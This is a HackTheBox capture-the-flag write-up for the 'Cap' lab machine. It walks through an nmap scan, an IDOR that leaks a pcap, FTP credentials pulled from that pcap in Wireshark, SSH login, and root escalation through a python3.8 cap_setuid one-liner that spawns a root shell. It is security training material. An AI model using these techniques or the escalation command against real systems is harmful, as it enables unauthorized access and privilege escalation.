---
title: Cap - HackTheBox Writeup
categories: [HackTheBox, Linux, Privilege Escalation]
tags: [idor, wireshark, ftp, ssh, capabilities, cve]
image:
  path: /assets/img/cap/cover.png
---

## Machine Overview

| Property | Value |
|----------|-------|
| **Machine Name** | Cap |
| **IP Address** | 10.129.77.115 |
| **Difficulty** | Easy |
| **OS** | Linux |

---

## Initial Reconnaissance

### Nmap Scan

Let's start with a comprehensive network scan to identify open ports and services:

```bash
nmap -sC -sV 10.129.77.115
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-27 12:24 +0200
Nmap scan report for 10.129.77.115
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**
- **Port 21 (FTP):** vsftpd 3.0.3 service running
- **Port 22 (SSH):** OpenSSH 8.2p1 available
- **Port 80 (HTTP):** Gunicorn web server with a "Security Dashboard"

---

## Enumeration Phase

### FTP Service Check

First, we attempt anonymous access to the FTP service:

```bash
ftp 10.129.77.115
```

Unfortunately, anonymous access is not permitted. We'll need credentials, which we'll discover later.

### Web Service Exploration

The most interesting service appears to be the web application running on port 80. Let's access the "Security Dashboard":

![Security Dashboard](/assets/img/cap/1-1.png)

Browsing through the dashboard, I clicked on "Security Snapshot" and noticed an interesting endpoint:

```
http://10.129.77.115/data/1
```

This immediately caught my attention as a potential **IDOR (Insecure Direct Object Reference)** vulnerability.

---

## Vulnerability Discovery: IDOR

### Testing IDOR

Let's test the IDOR by changing the parameter from `1` to `0`:

```
http://10.129.77.115/data/0
```

**Success!** We gained access to an old `.pcap` file. This is a significant discovery - network packet capture files can contain sensitive information like credentials.

![IDOR Vulnerability](/assets/img/cap/1-2.png)

---

## Traffic Analysis with Wireshark

### Opening the PCAP File

Let's open the captured traffic in Wireshark to analyze the network activity:

```bash
wireshark data.pcap
```

Examining the packet capture, I noticed FTP service logs that could contain authentication information. Let's follow the TCP stream to see the conversation:

![Wireshark FTP Stream](/assets/img/cap/1-3.png)

### Credential Extraction

Perfect! The stream reveals FTP authentication details:

```
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
```

**Extracted Credentials:**
- Username: `nathan`
- Password: `Buck3tH4TF0RM3!`

Additionally, there's a reference to **user.txt** available on the FTP service.

---

## Initial Access

### FTP File Retrieval

Now that we have FTP credentials, let's retrieve the user flag:

```bash
ftp 10.129.77.115
Connected to 10.129.77.115.
220 (vsFTPd 3.0.3)
Name: nathan
331 Please specify the password.
Password: Buck3tH4TF0RM3!
230 Login successful.

ftp> get user.txt
226 Transfer complete.
```

### SSH Connection

Now let's establish an SSH session using the same credentials:

```bash
ssh nathan@10.129.77.115
```

Authentication successful! We're now on the system as the `nathan` user.

---

## Privilege Escalation

### Linux Capabilities Enumeration

Given that the machine is named "Cap", the hint is to check **Linux capabilities**. Let's examine what special capabilities are assigned to binaries:

```bash
getcap -r / 2>/dev/null
```

**Interesting Finding:**

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

This is the vulnerability! The `python3.8` binary has the `cap_setuid` capability, which allows it to change the user ID without being root.

### Understanding cap_setuid

The `cap_setuid` capability allows a binary to call `setuid()` to change the effective user ID. This means we can use Python to escalate to root privileges.

### Exploitation via GTFOBins

Let's check [GTFOBins](https://gtfobins.github.io) for Python privilege escalation techniques:

```bash
python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

**Breakdown:**
1. `os.setuid(0)` - Changes the effective user ID to 0 (root)
2. `os.execl("/bin/sh", "sh")` - Executes a shell with root privileges

### Root Access

```bash
$ python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# cat /root/root.txt
[FLAG_CONTENT]
```

Success! We have achieved root access and obtained the final flag.

---

## Summary

This machine demonstrated several important security concepts:

| Vulnerability | Impact | Severity |
|---------------|--------|----------|
| **IDOR** | Unauthorized access to sensitive files | High |
| **Cleartext Credentials** | Direct authentication bypass | Critical |
| **Misconfigured Capabilities** | Privilege escalation to root | Critical |

### Attack Chain

```
Nmap Scan → Web Enumeration → IDOR Discovery → PCAP Download → 
Wireshark Analysis → Credential Extraction → SSH Access → 
Capabilities Check → Python Privilege Escalation → Root Access
```

### Key Learnings

1. **Test all parameters** for IDOR vulnerabilities
2. **Analyze network traffic** for sensitive information (credentials, keys, etc.)
3. **Check Linux capabilities** with `getcap` when escalation hints are present
4. **Use GTFOBins** as a reference for known exploitation techniques

---

## Tools Used

- `nmap` - Network reconnaissance
- `wireshark` - Network packet analysis
- `ftp` - File transfer protocol client
- `ssh` - Remote shell access
- `getcap` - Linux capabilities viewer
- `python3` - Exploitation script

---

*Last Updated: 2026-09-27*
